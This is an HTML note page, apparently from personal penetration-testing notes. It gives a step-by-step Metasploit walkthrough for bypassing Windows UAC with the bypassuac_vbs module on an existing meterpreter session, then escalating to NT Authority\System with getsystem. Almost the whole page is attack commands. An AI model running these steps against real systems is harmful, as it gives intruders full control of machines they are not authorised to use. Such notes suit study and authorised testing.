<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bypassuac_vbs (meterpreter)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bypassuac_vbs (meterpreter)</h1><br/>We will use the module exploit/windows/local/bypassuac_vbs<br /><br /><strong><h3>Privilege Increase to </h3></strong><strong><h3>Admin</h3></strong><br /><br />To check if a UAC is enabled<br /><div class="codebox"><pre>meterpreter &gt; run post/windows/gather/win_privs</pre></div><br />we put in background the session where on the machine we have meterpreter shell but not Administrative permission<br /><div class="codebox"><pre>meterpreter &gt; background</pre></div><br />we search for the bypass user account control module and Administrative privilege<br /><div class="codebox"><pre>msf &gt; search bypassuac</pre></div><br /><br /><div class="codebox"><pre>msf &gt; use exploit<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bypassuac_vbs</pre></div><br /><br /><div class="codebox"><pre>msf &gt; show options</pre></div><br /><div class="codebox"><pre>msf &gt; sessions<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SESSION 1                               <span style="color:#0088ff;font-weight:400">#the one that we have put in background</span></pre></div><br /><div class="codebox"><pre>msf &gt; run</pre></div><br /><br />If the exploit succeed, we will obtain <span style="color:#00ff00;text-decoration:underline;">Administrator privileges</span> on the machine, but not yet the highest privileges. Now that we are admin anyway the <span style="color:#1e90ff;">getsystem</span> command works<br /><div class="codebox"><pre>meterpreter &gt; getsystem</pre></div><br /><br />And now we are NT Authority\System of the machine!<br />which is the most privileged account on Windows, <br />we can verify it with<br /><div class="codebox"><pre>meterpreter &gt; getuid</pre></div><br /></div>
</body>
</html>
